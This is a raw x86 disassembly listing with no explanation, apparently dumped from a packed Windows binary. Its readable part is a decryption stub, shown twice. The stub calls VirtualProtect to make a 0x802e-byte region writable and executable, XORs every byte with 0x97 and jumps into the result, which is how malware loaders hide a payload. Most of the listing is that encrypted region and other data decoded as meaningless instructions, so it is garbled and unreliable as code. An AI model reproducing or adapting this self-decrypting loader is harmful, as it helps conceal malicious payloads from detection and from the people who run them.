add [ eax + 0x46 ] dh
add [ eax + 0x2c004670 ] dh
jno r-xdata
add [ eax - 0x17 ] cl
inc esp
add [ ebx + edi * 2 + 0xc080046 ] cl
inc ebp
add al ch
dec esi
inc ebp
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2400454f ] cl
imul eax [ esi ] 0x30
add [ esi ] 0x54
and eax 0x8ef40045
inc esi
add [ edx + edx * 4 + 0x46 ] dl
add [ eax ] dl
xchg ecx eax
inc esi
add ah ch
and eax 0x25f00045
inc ebp
add [ ebx + edx * 4 + 0x24500046 ] cl
inc ebp
add al cl
xchg edx eax
inc esi
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ ebx + edi * 2 ] dl
inc esi
add al ah
jns r-xdata
add [ ebx + ecx - 0x197bffbb ] al
inc esp
je r-xdata
add [ ebx + esi * 4 + 0x46 ] dh
add al ch
insd
inc esi
add [ eax - 0x52 ] bh
inc esi
add [ eax - 0x6b ] bl
inc esi
add [ eax + esi * 4 ] ch
inc esi
add [ eax ] dl
jpo r-xdata
add eax [ eax ]
add [ edx ] al
add [ edi ] al
outsd
add al 0x0
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] ecx
add [ 0x48ac6c00 ] dl
add al bh
add al [ eax ]
add [ eax ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
xor [ eax + 0x3 ] eax
add [ eax ] al
push cs
je r-xdata
popad
jb r-xdata
outsd
js r-xdata
outsb
dec ebp
outsb
jne r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x31031
add [ esi ] al
add [ esi ] al
push eax
add eax [ eax ]
add [ eax ] cl
add [ ecx ] cl
inc ebx
push 0x426b6365
jo r-xdata
push es
push esp
inc esi
outsd
jb r-xdata
jb r-xdata
or eax 0x694c0900
outsb
xor ah [ ebx + eax ]
add [ eax ] al
add [ eax ] al
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor ch [ eax ]
add eax [ eax ]
add [ ecx ] cl
add [ ecx ] cl
sbb [ ebx ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + ebp * 2 + 0x73 ] cl
je r-xdata
add [ eax ] al
pop es
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
adc al 0x3
or [ ebx ] al
add [ eax ] al
je r-xdata
sub al 0x3
add [ eax ] al
or dl [ eax + 0x6f ]
jo r-xdata
inc edx
jne r-xdata
and [ ebx ] al
add [ eax ] al
add al [ eax ]
pop es
popad
outsb
insb
xor [ ebx + eax ] edx
outsb
jne r-xdata
iretd
xor [ eax ] ebx
stosb [ edi ]
dec eax
add [ edx + eax * 2 + 0x5e0046 ] bh
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
add [ 0x318c0042 ] cl
inc esp
add [ eax + 0x14 ] cl
inc esp
add [ eax - 0x29 ] bh
inc ebp
add [ eax + 0x7b ] ch
dec eax
add [ ebp + ebx * 8 + 0x42 ] bh
add [ eax + 0x59 ] bh
inc ebx
add [ ebx + eax * 2 + 0x69080043 ] bh
dec eax
add al al
int 0x47
add [ eax ] bl
arpl [ edi ] ax
mov eax eax
mov eax 0x70048ac
dec eax
add eax [ eax ]
add [ eax ] dl
inc ebx
add [ eax ] cl
imul ecx [ eax ] r-xdata
sbb [ ebx + 0x47 ] ah
add [ ebx + 0x48acb8c0 ] cl
add [ edi ] al
add [ eax ] cl
dec ecx
dec ecx
dec ebp
push esi
imul esp [ ebp + 0x77 ] 0x34031
add [ edx ] cl
dec ecx
inc ebp
jo r-xdata
add [ eax ] eax
outsd
js r-xdata
outsd
jo r-xdata
outsd
js r-xdata
add [ eax ] al
add eax 0x63410b00
je r-xdata
add [ ebx ] al
add [ eax ] al
add al [ eax ]
pop es
inc edx
jne r-xdata
push r-xdata
call sub_48acd4
jle r-xdata
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x802e
push ebx
call VirtualProtect
xor eax eax
xor [ ecx ] edx
add ah bl
inc [ ebx ]
pop esp
fiadd [ ebp ]
mov [ ebx ] cl
inc esp
add [ eax - 0x5fffbbda ] bl
out dx eax
inc edx
add [ eax - 0x5c ] cl
inc ebp
ja r-xdata
outsb
jne r-xdata
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x31756e65
outsd
js r-xdata
sbb al 0x3
add [ eax ] al
or [ eax ] al
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
inc ecx
push eax
xor al 0x31
inc esp
add eax [ eax ]
add [ edi ] cl
add [ ecx ] cl
dec ecx
inc edi
cmp [ ebx ] al
add [ eax ] al
or al 0x0
cmove esp [ ecx + 0x74 ]
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
je r-xdata
nop
lea edx [ eax + ebx ]
mov dl [ edx ]
xor dl 0x97
lea ecx [ eax + ebx ]
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x802f
jne r-xdata
nop
nop
nop
add ebx 0x4914
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
push esp
inc esi
outsd
jb r-xdata
add [ esi ] cl
inc eax
add eax [ eax ]
jae r-xdata
insd
push eax
imul esp [ ebx + 0x6b ] 0x3c317265
add eax [ eax ]
add [ 0x694c0900 ] cl
xor [ ebx ] al
add [ eax ] al
or al [ eax ]
push cs
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
jbe r-xdata
arpl [ eax + 0x6f ] bp
push ebp
inc esp
push eax
xor [ esi ] eax
add [ eax ] al
adc [ eax ] al
or cl [ ecx + 0x64 ]
inc ebp
cmp al 0x3
add [ eax ] al
outsb
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or [ ecx + ebp * 2 + 0x73 ] cl
je r-xdata
xor al 0x3
add [ eax ] al
or eax [ eax ]
or [ eax + 0x61 ] edx
imul ebp [ esi + 0x74 ] 0x31786f42
sub_48acd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
push r-xdata
call sub_48acd4
jle r-xdata
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x802e
push ebx
call VirtualProtect
xor eax eax
nop
lea edx [ eax + ebx ]
mov dl [ edx ]
xor dl 0x97
lea ecx [ eax + ebx ]
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x802f
jne r-xdata
iretd
nop
nop
nop
add ebx 0x4914
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
sub_48ae40
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
loop r-xdata
int3
push ds
retn 0x7e7b
sub_48b0a1
inc edi
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x49
int1
push ds
0x1c9d

sub_48b0dd
enter 0x9797 0x7
pop es
pop es
pop es
pop es
pop es
jg r-xdata
jle r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
adc al 0x53
xchg [ esi - 0x7 ] edi
mov eax [ 0x7079797 ]
pop es
sbb al 0x6d
jle r-xdata
pop es
pop es
pop es
pop es
sbb dl [ edx ]
aaa
push 0x68
push 0x97bbce7e
xchg edi eax
cwde
adc eax 0x979797a3
pop ds
rol [ edi + 0x7e ] cl
out 0x94 al
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
inc ebp
int1
push ds
retn 0xcd65
xchg esp eax
shl [ ebx - 0x5c ] cl
push 0x97fe207e
xchg edi eax
pop es
pop es
push eax
sar [ ebx - 0xc ] cl
clc
out 0xee eax
push eax
shl [ edi - 0x49 ] cl
mov eax 0xd250b7f5
arpl [ ebp + 0x7ee4fbb2 ] si
int3
mov cl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
shl [ ebp - 0x31 ] cl
jle r-xdata
0x79797a7 0x707
mov ch 0x97
xchg edi eax
pop es
sub_48b10f
push 0x966f1440
jle r-xdata
jle r-xdata
sahf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
dec ecx
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7e77
mov ch 0x97
xchg edi eax
pop es
int1
push ds
0x1c9d
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x49
sub_48b1ae
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
adc dl [ edi - 0x68 ]
adc esi eax
xchg esi eax
xchg edi eax
xchg edi eax
jle r-xdata
push ecx
ficom [ edi - 0x2f8f869 ]
cli
jle r-xdata
sar [ esi + 0x33 ] 0xc2
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
out dx al
int 0x7e
salc
test al 0x97
xchg edi eax
xlat
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
enter 0x597e 0x97
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push ds
0x7e6b
mov [ 0x7079797 ] eax
0x7e9b
mov eax 0xa4079797
inc ebp
std
stc
int1
push ds
retn 0x7e73
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
rcr [ esi ] 0x11
sbb edx [ edi + 0x717e9797 ]
loop r-xdata
pop es
pop es
pop es
pop es
pop es
pop ds
rol [ ebx + 0x7e ] cl
scasd [ edi ]
mov ebp 0x7079797
pop es
pop es
pop es
pop es
pop es
[ edx + 0x5b ]
jecxz r-xdata
sub esp [ ebx + 0x7079797 ]
imul ebp [ eax + 0x68 ] 0xffffffc2
jle r-xdata
imul ebp [ eax + 0x68 ] 0x7070707
int3
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
mov eax 0x6869ce7e
push 0x7070707
cli
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
pop esi
sbb al 0xca
arpl [ esi - 0x3a ] di
xlat
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc [ ecx + 0x68979797 ] dl
in al 0xd7
push 0x68a49fc1
sar [ esi + 0x79 ] 0x1
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
push 0x57edbc0
stosb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
mov cl 0x97
xchg edi eax
sbb al 0x48
jle r-xdata
xchg edi eax
pop es
pop es
jle r-xdata
jle r-xdata
leave
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sar [ esi - 0x43 ] 0xfa
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
adc al 0x53
xchg [ esi - 0x5 ] edi
mov ebp 0xfdcf9797
cli
int1
push ds
ror [ ebx + 0x7e ] cl
push 0xffffffbf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sbb al 0x48
jle r-xdata
cdq
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
push 0x97ba157e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd1
mov [ 0xffffffff97d3b37e ] eax
xchg edi eax
pop es
pop es
pop es
pop es
pushad
dec edi
mov [ edi + 0x7e ] ss
aam 0x97
xchg edi eax
xchg esp eax
push edi
mov esi 0x6f7e96fd
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sar [ esi + 0x5e ] 0xd0
xchg edi eax
xchg edi eax
jg r-xdata
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
jmp esi
sub_48b6f1
xchg edi eax
xchg edi eax
push 0x5e7eefc7
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
adc eax [ edx - 0x4e ]
xchg edi eax
xchg edi eax
push 0x7e9bb3e3
xor esp ebx
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
mov eax 0x7079797
pop es
pop es
pop es
xlat
jle r-xdata
pop es
pop es
sar [ esi + 0x6c ] 0x9d
xchg edi eax
xchg edi eax
pop es
pop es
int1
push ds
0xf9f07e23 0x9797
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
fcom [ edi + 0x7070797 ]
pop es
pop es
jle r-xdata
pop es
0x9797
xchg edi eax
jle r-xdata
cli
xchg edi eax
xchg edi eax
pop es
push 0x7070768
mov bh 0x97
xchg edi eax
pop es
0x9797
xchg edi eax
xchg edi eax
sbb bl dl
and ebx [ edx ]
lds edx [ edi - 0x3fa88169 ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0xf157
cwde
adc edi ebx
cdq
xchg edi eax
xchg edi eax
jle r-xdata
mov eax 0x79797b7
imul ebp [ eax + 0x68 ] 0x12
push edi
jle r-xdata
lahf
jle r-xdata
mov ah 0xc1
sar [ esi + 0x49 ] 0xe6
xchg edi eax
xchg edi eax
sbb al 0xd2
lahf
jle r-xdata
push 0x7076868
pop es
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov ecx 0x13989797
jpo r-xdata
mov eax 0xc40972ce
push ds
or [ edi - 0x69 ] eax
xchg edi eax
xchg edi eax
jle r-xdata
mov bh 0x97
xchg edi eax
movsb [ edi ] [ esi ]
push edi
jle r-xdata
shl [ ebx ] cl
jg r-xdata
xchg edi eax
xchg edi eax
push 0x397e5712
push 0x68
push 0x7e070707
cmp [ edx + 0x7079797 ] esp
pop es
pop es
pop es
cwde
adc bl [ ebx + 0x7e9797cd ]
in eax dx
xchg [ edi - 0x1d973969 ] dl
arpl [ esi - 0x48 ] di
mov bh 0x97
xchg edi eax
rcl [ edi - 0x67b3ed69 ] 0x13
sahf
mov edx [ edi + 0x7257ff97 ]
in eax dx
daa
les ebx [ esi ]
or [ ebx - 0x69 ] ebx
xchg edi eax
xchg edi eax
jg r-xdata
mov edx 0x7dff9797
push ss
jge r-xdata
cwde
jle r-xdata
retn 0x97b4
retn
sub_48b734
sbb dl [ edx ]
jg r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
push 0x97971701
xchg edi eax
jle r-xdata
push 0x8ae67e68
xchg edi eax
xchg edi eax
pop es
pop es
sbb bl dl
ja r-xdata
xchg edi eax
xchg edi eax
cwde
adc bh [ eax ]
scasb [ edi ]
xchg edi eax
xchg edi eax
sbb dl [ edx ]
pop edi
push 0x68
push 0xf3c168c7
adc al 0x5f
xchg ebp eax
test [ edi + 0x7070797 ] dl
pop es
pop es
adc dl [ edi + 0x7e ]
0x9792
jle r-xdata
push 0xc27e6be7
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x7e68a46d 0xa2e2
pop es
pop es
pop es
pop es
jle r-xdata
fcom [ edi + 0x7070797 ]
pop es
pop es
jle r-xdata
pop es
0x9797
xchg edi eax
jle r-xdata
cli
xchg edi eax
xchg edi eax
pop es
push 0x7070768
mov bh 0x97
xchg edi eax
pop es
0x9797
pop es
pop es
sar [ esi + 0x6c ] 0x9d
xchg edi eax
xchg edi eax
pop es
pop es
int1
push ds
0xf9f07e23 0x9797
xchg edi eax
xchg edi eax
xchg edi eax
pop es
xchg edi eax
xchg edi eax
sbb bl dl
and ebx [ edx ]
lds edx [ edi - 0x3fa88169 ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0xf157
cwde
adc edi ebx
cdq
xchg edi eax
xchg edi eax
jle r-xdata
mov eax 0x79797b7
imul ebp [ eax + 0x68 ] 0x12
push edi
jle r-xdata
lahf
jle r-xdata
mov ah 0xc1
sar [ esi + 0x49 ] 0xe6
xchg edi eax
xchg edi eax
sbb al 0xd2
lahf
jle r-xdata
push 0x7076868
pop es
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov ecx 0x13989797
jpo r-xdata
mov eax 0xc40972ce
push ds
or [ edi - 0x69 ] eax
xchg edi eax
xchg edi eax
jle r-xdata
mov bh 0x97
xchg edi eax
movsb [ edi ] [ esi ]
push edi
jle r-xdata
shl [ ebx ] cl
jg r-xdata
xchg edi eax
xchg edi eax
push 0x397e5712
push 0x68
push 0x7e070707
cmp [ edx + 0x7079797 ] esp
pop es
pop es
pop es
cwde
adc bl [ ebx + 0x7e9797cd ]
in eax dx
xchg [ edi - 0x1d973969 ] dl
arpl [ esi - 0x48 ] di
mov bh 0x97
xchg edi eax
rcl [ edi - 0x67b3ed69 ] 0x13
sahf
mov edx [ edi + 0x7257ff97 ]
in eax dx
daa
les ebx [ esi ]
or [ ebx - 0x69 ] ebx
xchg edi eax
xchg edi eax
jg r-xdata
mov edx 0x7dff9797
push ss
jge r-xdata
cwde
adc eax [ edx - 0x4e ]
xchg edi eax
xchg edi eax
push 0x7e9bb3e3
xor esp ebx
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
jle r-xdata
retn 0x97b4
retn
sub_48b768
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sar [ esi + 0x6c ] 0x9d
xchg edi eax
xchg edi eax
pop es
pop es
int1
push ds
0xf9f07e23 0x9797
sub_48b800
scasb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
das
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
cwde
xor eax 0x1e6bca1e
fisub [ ebx + 0x1e ]
retn 0x1c6f
sub_48b86b
push ss
jpo r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg ebx eax
xchg edi eax
xchg edi eax
rol eax 0x7e
dec edx

jle r-xdata
out 0x97 al
xchg edi eax
pop es
std
int1
jle r-xdata
mov ebx 0x7079797
push 0xb77ec7e1
push ds
ror [ ecx + 0x7e ] cl
retn 0x97fe
xchg edi eax
xchg edi eax
pop es
pop es
std
mov ecx 0x97feb37e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb al 0x47
jle r-xdata
rol al 0x7e
mul [ eax + 0x68 ]
push 0x7070707
pop es
pop es
pop es
cwde
adc edi [ ebp - 0x73 ]
xchg edi eax
xchg edi eax
jle r-xdata
mov eax [ 0x20989797 ]
xchg [ esi + 0x37 ] bh
leave
xchg edi eax
xchg edi eax
adc al 0x7b

sub_48b88d
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97974b20
xchg edi eax
jle r-xdata
int1
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sar [ esi + 0x78 ] 0xb8
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
out 0x97 al
xchg edi eax
pop es
std
int1
jle r-xdata
mov ebx 0x7079797
push 0xb77ec7e1
push ds
ror [ ecx + 0x7e ] cl
retn 0x97fe
xchg edi eax
xchg edi eax
pop es
pop es
std
mov ecx 0x97feb37e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb al 0x47
jle r-xdata
rol al 0x7e
mul [ eax + 0x68 ]
push 0x7070707
pop es
pop es
pop es
cwde
adc edi [ ebp - 0x73 ]
xchg edi eax
xchg edi eax
jle r-xdata
mov eax [ 0x20989797 ]
xchg [ esi + 0x37 ] bh
leave
xchg edi eax
xchg edi eax
adc al 0x7b

sub_48b8fc
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x87e
sub_48b9d1
popfd
xchg edi eax
xchg edi eax
int1
push ds
ror [ ecx - 0x31 ] cl
std
stc
int1
push ds
shl [ edi - 0x31 ] cl
std
int1
push ds
shl [ ebp - 0x31 ] cl
jle r-xdata
sbb [ esi ] 0xffffffdb
mov bl 0xbf
jle r-xdata
mov dh 0x97
xchg edi eax
pop es
sbb al 0x6f
std
jle r-xdata
fwait
jle r-xdata
in eax 0x97
xchg edi eax
pop es
pop es
pop es
cwde
adc ebp [ edi - 0x4b ]
xchg edi eax
xchg edi eax
adc al 0x57
xchg ebp eax
jle r-xdata
xchg edx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
stosb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
jecxz r-xdata
std
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
outsb
push 0x7070768
int1
adc al 0xae
xchg edi eax
jle r-xdata
pop es
pop es
jle r-xdata
mov esi 0xc4ff9797
or [ esi + 0x707ec065 ] ebx
0x7079797 0x7ecf
shl [ eax + 0x7079797 ] cl
pop es
xchg edi eax
pop es
pop es
iretd
push 0x7ec1c768
out dx eax
mov ss [ edi - 0x4c389769 ]
adc dl [ edi + 0x7e ]
push es
push edi
jle r-xdata
test [ edi - 0x526f8069 ] edx
xchg edi eax
xchg edi eax
sbb al 0xc2
pop esi
push 0x7076868
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
pop esi
jle r-xdata
pop es
pop es
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
int1
push ds
retn 0xa453
cmc
jle r-xdata
ficom [ edi - 0x2f8f869 ]
jpo r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd3
mov bl 0x93
jle r-xdata
xchg edi eax
xchg edi eax
jle r-xdata

sbb al 0x4e
std
hlt
mov edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp esi
outsb
push 0x6bea1468
xchg edi eax
cwde
adc edi eax
outsb
push 0xd9b87e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
inc ecx
imul ebp [ eax + 0x68 ] 0x7e57d21f
in eax dx
iretd
sub_48ba59
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
stosb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
jecxz r-xdata

xchg edi eax
pop es
pop es
iretd
push 0x7ec1c768
out dx eax
mov ss [ edi - 0x4c389769 ]
adc dl [ edi + 0x7e ]
push es
ficom [ edi - 0x2f8f869 ]
cmc
jle r-xdata
pop es
pop es
pop es
pop es
jg r-xdata
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
int1
push ds
retn 0xa453
pop es
pop es
jle r-xdata
mov esi 0xc4ff9797
or [ esi + 0x707ec065 ] ebx
0x7079797 0x7ecf
shl [ eax + 0x7079797 ] cl
pop es
pop esi
push 0x7076868
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
pop esi
jle r-xdata
jpo r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd3
mov bl 0x93
jle r-xdata
xchg edi eax
xchg edi eax
jle r-xdata
sbb al 0x4e
std
hlt
mov edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp esi
outsb
push 0x6bea1468
xchg edi eax
cwde
adc edi eax
outsb
push 0xd9b87e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
inc ecx
imul ebp [ eax + 0x68 ] 0x7e57d21f
in eax dx
iretd
sub_48bab6
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc bh [ ebx - 0x58 ]
xchg edi eax
xchg edi eax
jle r-xdata
sbb al 0x4e
std
hlt
mov edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp esi
outsb
push 0x6bea1468
xchg edi eax
cwde
adc edi eax
outsb
push 0xd9b87e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
inc ecx
imul ebp [ eax + 0x68 ] 0x7e57d21f
in eax dx
iretd
sub_48bafe
xchg edi eax
xchg edi eax
pop es
jg r-xdata
push 0xf77e9be2
rcl [ edi + 0x7070797 ] 0x7
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
int 0x97
xchg edi eax
adc al 0x53
cmp [ esi - 0x80 ] 0xffffffa8
xchg edi eax
xchg edi eax
pop es
pop es
pop es
cwde
adc ch ch
insb
push 0x4fea1a68
jle r-xdata
xchg edi eax
xchg edx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc bl [ esi - 0x68 ]
adc esp [ edi + 0x2f9797ac ]
fcmove st5
xchg edi eax
xchg edi eax
int1
scasb [ edi ]
xchg esi eax
cwde
adc dh [ ebp + 0x7e9797ac ]
fst [ edi + 0x1ef1cc97 ]
0x1c3d
pop es
pop es
jg r-xdata
ficom [ edi + 0x54ac0797 ]
jle r-xdata
and [ ebp + 0x68 ] 0x68
pop es
pop es
cli
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
mov dh 0x97
xchg edi eax
jle r-xdata
pop es
pop es
jle r-xdata
mov [ edi + 0x7070797 ] edx
pop es
pop es
push 0x1c070768
jpo r-xdata
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp esi
outsb
push 0x6bea1468
xchg edi eax
cwde
adc edi eax
outsb
push 0xd9b87e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
inc ecx
imul ebp [ eax + 0x68 ] 0x7e57d21f
in eax dx
iretd
xchg edi eax
pop es
pop es
pop es
cwde
adc edi [ edx ]
stosd [ edi ]
xchg edi eax
xchg edi eax
jle r-xdata
mov bh 0x97
push ds
rol [ edi + 0x7e ] cl
jbe r-xdata
push 0xf1070768
xchg edi eax
pop es
into
pushad
dec edi
pop esi
push esp
pop es
pop es
retn 0x9797
pop es
jg r-xdata
lahf
out 0x97 al
xchg edi eax
pop es
rcr [ esi ] 0xc9
fistp [ edi - 0x2b ]
mov edi 0xa17e9797
leave
xchg edi eax
xchg edi eax
sbb al 0xd2
lahf
jle r-xdata
xchg edi eax
jle r-xdata
adc ch [ edi + 0x6a ]
push 0x80177f68
xchg edi eax
rcl [ edi - 0x2f8f869 ] 0xb9
enter 0xc77e 0x6b
push 0x7070768
pop es
pop es
pop es
push ds
int1
adc al 0xaf
xchg edi eax
jle r-xdata
mov ah 0x97
xchg edi eax
jle r-xdata
pop es
pop es
push 0x1c070768
ror [ ebx + 0x7e ] cl
outsd
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
[ edi + 0x7e979795 ]
jpo r-xdata
lea edx [ edi + 0x7070797 ]
pop es
sbb al 0x48
retn
int1
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
pop ss
push 0x68
push 0x97805b7f
xchg edi eax
sbb dl dl
jae r-xdata
jle r-xdata
jle r-xdata
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
outsd
push 0x68
push 0x9780177f
lodsd [ esi ]
xchg edi eax
xchg edi eax
0x7e7b
jle r-xdata
adc [ edi + 0x1c070797 ] 0x48
sub_48bc53
xchg edi eax
xchg edi eax
pop es
into
pushad
dec edi
pop esi
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
outsd
push 0x68
push 0x9780177f
xchg edi eax
jle r-xdata
adc ch [ edi + 0x6a ]
push 0x80177f68
xchg edi eax
rcl [ edi - 0x2f8f869 ] 0xb9
enter 0xc77e 0x6b
push 0x7070768
pop es
pop es
pop es
push ds
0x7e7b
sub_48bd04
xchg edi eax
xchg edi eax
int1
adc al 0xad
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
movsb [ edi ] [ esi ]
push 0x97da5b7e
xchg edi eax
pop es
pop es
pop es
cwde
adc ebx [ esi + 0x7e9797de ]
loopne r-xdata
pop es
pop es
pop es
pop es
pop es
les ebp [ eax + 0x1 ]
cmp edx [ edi + 0x777f9797 ]
xchg edi eax
xchg edi eax
adc al 0x6f
xchg esi eax
cwde
adc ebp [ edi ]
sti
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
xchg edi eax
pop es
iretd
std
stc
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc dl [ edi - 0x68 ]
adc dl bh
xchg edi eax
xchg edi eax
xchg edi eax
sbb dl dl
jg r-xdata
pop es
pop es
